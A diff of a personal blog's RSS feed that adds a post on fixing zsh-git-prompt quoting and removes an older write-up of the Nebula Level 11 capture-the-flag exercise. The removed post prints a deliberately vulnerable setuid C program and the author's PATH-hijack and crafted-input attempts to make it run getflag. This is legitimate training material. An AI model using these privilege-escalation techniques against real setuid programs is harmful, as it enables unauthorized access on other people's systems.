@@ -6,8 +6,43 @@
     <description>Recent content on Zea&#39;s</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Mon, 14 Sep 2015 16:51:18 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 30 Jun 2016 17:46:35 +0800</lastBuildDate>
     <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Zsh git prompt</title>
+      <link>/post/2016-06-30-zsh-git-prompt/</link>
+      <pubDate>Thu, 30 Jun 2016 17:46:35 +0800</pubDate>
+      
+      <guid>/post/2016-06-30-zsh-git-prompt/</guid>
+      <description>&lt;p&gt;之前在Zsh中手动添加了&lt;a href=&#34;https://github.com/olivierverdier/zsh-git-prompt&#34;&gt;zsh-git-prompt&lt;/a&gt;插件，
+不过一直存在一个问题，就是更换文件夹后&lt;code&gt;$PROMPT&lt;/code&gt;中的&lt;code&gt;$(git_super_status)&lt;/code&gt;变量不会自动更新，
+必须重新执行&lt;code&gt;source ~/.zshrc&lt;/code&gt;才行。&lt;/p&gt;
+
+&lt;p&gt;当时没有时间折腾，今天有时间仔细看了一下问题所在，原来是&lt;code&gt;$PROMPT&lt;/code&gt;变量的设置有问题，原本的设置是：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PROMPT=&amp;quot;$(git_super_status) %# &amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在这里，错误地使用了双引号，导致&lt;code&gt;$(git_super_status)&lt;/code&gt;函数在赋值阶段就被字符串替换成了当时该函数的值，
+因此之后即使更换文件夹，这个部分的显示内容也不会发生变化。双引号情况下&lt;code&gt;$PROMPT&lt;/code&gt;变量实际的值：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(master|✚1) % echo $PROMPT
+(%{%}master%{%}|%{%}%{✚%G%}1%{%}%{%}) %# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到&lt;code&gt;$PROMPT&lt;/code&gt;中的&lt;code&gt;$(git_super_status)&lt;/code&gt;已经被替换为&lt;code&gt;(%{%}master%{%}|%{%}%{✚%G%}1%{%}%{%})&lt;/code&gt;，
+故而每次显示的都是同样的内容。正确的做法是在&lt;code&gt;.zshrc&lt;/code&gt;中使用单引号替代双引号，
+保证脚本处理的时候不会对字符串内容进行替换，从而保留真正的内容，留待运行时再进行替换：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PROMPT=&#39;$(git_super_status) %# &#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(master|✚1) % echo $PROMPT   
+$(git_super_status) %# 
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
     
     <item>
       <title>[转]windows下交换CapsLock和Ctrl键</title>
@@ -1620,259 +1655,6 @@ drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Here is the executable &lt;em&gt;flag12&lt;/em&gt; with Set-User-ID bit, run it and a bash with &lt;em&gt;flag12&lt;/em&gt; user privilege will show up!&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Exploit Exercises - Nebula Level 11</title>
-      <link>/post/2014-01-26-nebula-level11/</link>
-      <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
-      
-      <guid>/post/2014-01-26-nebula-level11/</guid>
-      <description>
-
-&lt;h3 id=&#34;about:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;About&lt;/h3&gt;
-
-&lt;p&gt;The &lt;em&gt;/home/flag11/flag11&lt;/em&gt; binary processes standard input and executes a shell command.&lt;/p&gt;
-
-&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
-
-&lt;p&gt;To do this level, log in as the &lt;em&gt;level11&lt;/em&gt; account with the password &lt;em&gt;level11&lt;/em&gt; . Files for this level can be found in /home/flag11.&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;h3 id=&#34;source-code:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Source code&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;sys/types.h&amp;gt;
-#include &amp;lt;fcntl.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;sys/mman.h&amp;gt;
-
-/*
- * Return a random, non predictable file, and return the file descriptor for it.
- */
-
-int getrand(char **path)
-{
-	char *tmp;
-	int pid;
-	int fd;
-
-	srandom(time(NULL));
-
-	tmp = getenv(&amp;quot;TEMP&amp;quot;);
-	pid = getpid();
-
-	asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, 
-			 &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10), 
-			 &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
-			 &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));
-
-	fd = open(*path, O_CREAT|O_RDWR, 0600);
-	unlink(*path);
-	return fd;
-}
-
-void process(char *buffer, int length)
-{
-	unsigned int key;
-	int i;
-
-	key = length &amp;amp; 0xff;
-
-	for(i = 0; i &amp;lt; length; i++) {
-		buffer[i] ^= key;
-		key -= buffer[i];
-	}
-
-	system(buffer);
-}
-
-#define CL &amp;quot;Content-Length: &amp;quot;
-
-int main(int argc, char **argv)
-{
-	char line[256];
-	char buf[1024];
-	char *mem;
-	int length;
-	int fd;
-	char *path;
-
-	if(fgets(line, sizeof(line), stdin) == NULL) {
-		errx(1, &amp;quot;reading from stdin&amp;quot;);
-	}
-
-	if(strncmp(line, CL, strlen(CL)) != 0) {
-		errx(1, &amp;quot;invalid header&amp;quot;);
-	}
-
-	length = atoi(line + strlen(CL));
-
-	if(length &amp;lt; sizeof(buf)) {
-		if(fread(buf, length, 1, stdin) != length) {
-			err(1, &amp;quot;fread length&amp;quot;);
-		}
-		process(buf, length);
-	} else {
-		int blue = length;
-		int pink;
-
-		fd = getrand(&amp;amp;path);
-
-		while(blue &amp;gt; 0) {
-			printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);
-
-			pink = fread(buf, 1, sizeof(buf), stdin);
-			printf(&amp;quot;pink = %d\n&amp;quot;, pink);
-
-			if(pink &amp;lt;= 0) {
-				err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
-			}
-			write(fd, buf, pink);
-
-			blue -= pink;
-		}  
-
-		mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
-		if(mem == MAP_FAILED) {
-			err(1, &amp;quot;mmap&amp;quot;);
-		}
-		process(mem, length);
-	}
-}
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;solution:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;In fact I have not passed this one yet, I have met a &lt;strong&gt;problem&lt;/strong&gt; which I will talk about later,
-right now I just want to explain my &lt;strong&gt;idea&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;The overall function of the program &lt;em&gt;/home/flag11/flag11&lt;/em&gt; is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.&lt;/p&gt;
-
-&lt;p&gt;More specifically, &lt;em&gt;flag11&lt;/em&gt; requires that the input should match the following pattern:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Content-Length: %d
-Content...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;here, depends on the content length &lt;em&gt;%d&lt;/em&gt;, &lt;em&gt;flag11&lt;/em&gt; will go into two branches, if &lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;,
-&lt;em&gt;flag11&lt;/em&gt; would read the content directly into &lt;em&gt;buf&lt;/em&gt; and pass it to &lt;em&gt;process&lt;/em&gt;.
-Note that it is required that &lt;code&gt;fread(buf, length, 1, stdin) == length&lt;/code&gt;, so we know that &lt;em&gt;length&lt;/em&gt; must be 1.
-(refer to &lt;a href=&#34;http://linux.die.net/man/3/fread&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;fread()&lt;/em&gt; for details)&lt;/p&gt;
-
-&lt;p&gt;Otherwise if &lt;em&gt;length&lt;/em&gt; is any number larger or equal to 1024, &lt;em&gt;flag11&lt;/em&gt; would buffer the input into a file first,
-then pass the content of the file to &lt;em&gt;process&lt;/em&gt;. I think these are the TWO WAYS mentioned in the description.&lt;/p&gt;
-
-&lt;p&gt;The function &lt;em&gt;process&lt;/em&gt; would do some calculation on &lt;em&gt;buf&lt;/em&gt; based on its content using XOR operation.
-So if we want to executes some commands like &lt;em&gt;/bin/getflag&lt;/em&gt;, we need to do some reverse calculation and find out
-what the origin &lt;em&gt;buf&lt;/em&gt; would be like.&lt;/p&gt;
-
-&lt;h4 id=&#34;way-one:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way One&lt;/h4&gt;
-
-&lt;p&gt;My first thought was that I could make &lt;em&gt;length&lt;/em&gt; to be 1, and make a soft link to &lt;em&gt;/bin/getflag&lt;/em&gt;, then leverage
-&lt;em&gt;flag11&lt;/em&gt; to execute this soft link. I first create a file &lt;em&gt;f.txt&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;``` text f.txt
-Content-Length: 1
-f&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;
-You can expect that `&#39;f&#39; ^ (length&amp;amp;&amp;amp;0xff) == &#39;g&#39;`, where *length* is 1.
-Then I would execute the following
-
-``` bash
-level11@nebula:~$ ln -s /bin/getflag /tmp/g
-level11@nebula:~$ export PATH=/tmp/:$PATH
-
-
-level11@nebula:~$ /home/flag11/flag11 &amp;lt; /home/level11/f.txt
-sh: gP,: command not found
-
-level11@nebula:/home/flag11$ ./flag11 &amp;lt; /home/level11/f.txt
-sh: $&#39;g\240\030&#39;: command not found
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Failed. Since each time the output command are different (but the first char &lt;em&gt;g&lt;/em&gt; is correct),
-it must be that &lt;em&gt;buf&lt;/em&gt; actually do not have a string terminator &amp;lsquo;\0&amp;rsquo;,
-so I tried a few times and finally&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ../flag11/flag11 &amp;lt; ls.txt
-getflag is executing on a non-flag account, this doesn&#39;t count
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Well&amp;hellip;here is the &lt;strong&gt;problem&lt;/strong&gt;, the &lt;em&gt;system()&lt;/em&gt; call would not drop privilege on my system&amp;hellip;&lt;/p&gt;
-
-&lt;p&gt;I read the &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;system()&lt;/em&gt; carefully, it mentioned that&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I also did some google and find &lt;a href=&#34;http://www.cplusplus.com/forum/articles/11153/&#34;&gt;this&lt;/a&gt; thread on cplusplus
-and &lt;a href=&#34;http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges&#34;&gt;this&lt;/a&gt;
-question on Stackoverflow ot be useful. It is said that &lt;em&gt;system()&lt;/em&gt; itself would not drop privileges,
-but Bash 2 would, and my bash is version 4, so I think this meybe the reason.&lt;/p&gt;
-
-&lt;p&gt;I came across an interesting solution for this routine by &lt;a href=&#34;http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html&#34;&gt;Reno Robert&lt;/a&gt;, who leveraged &lt;em&gt;LD_PRELOAD&lt;/em&gt; to initialize the buffer.&lt;/p&gt;
-
-&lt;h4 id=&#34;way-two:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way Two&lt;/h4&gt;
-
-&lt;p&gt;Anyway, before I realized this problem, I did do something through the second way,
-to get what the input should be from the output command, I wrote another program &lt;em&gt;gen.c&lt;/em&gt;:&lt;/p&gt;
-
-&lt;p&gt;``` c gen.c
-void process(char *buffer, int length)
-{
-        unsigned int key;
-        int i;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;    key = length &amp;amp; 0xff;
-
-    for(i = 0; i &amp;lt; length; i++) {
-            buffer[i] ^= key;
-            key -= (key ^ buffer[i]);
-    }
-    //system(buffer);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;}&lt;/p&gt;
-
-&lt;p&gt;main() {
-  char* cmd = &amp;ldquo;getflag&amp;rdquo;;
-  char buf[1024];
-  int len = strlen(cmd);
-  memset((void *)buf, 0, 1024&amp;gt;&amp;gt;2);
-  strncpy(buf, cmd, len+1);&lt;/p&gt;
-
-&lt;p&gt;process(buf, 1024);
-  printf(&amp;ldquo;Content-Length: 1024\n&amp;rdquo;);
-  fwrite(buf, 1024, 1, stdout);
-}&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;
-and after compiling into an executable *gen*, I tried to trigger the exploit like this
-
-``` bash
-level11@nebula:~$ ./gen | ../flag11/flag11
-blue = 1024, length = 1024, pink = 1024
-getflag is executing on a non-flag account, this doesn&#39;t count
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;same failure, and after that I changed the &lt;em&gt;cmd&lt;/em&gt; from &amp;ldquo;getflag&amp;rdquo; to &amp;ldquo;id&amp;rdquo; ,
-and the output is&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ./gen | ../flag11/flag11
-blue = 1024, length = 1024, pink = 1024
-uid=1012(level11) gid=1012(level11) groups=1012(level11)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;No privilege dropped )=&lt;/p&gt;
 </description>
     </item>
     
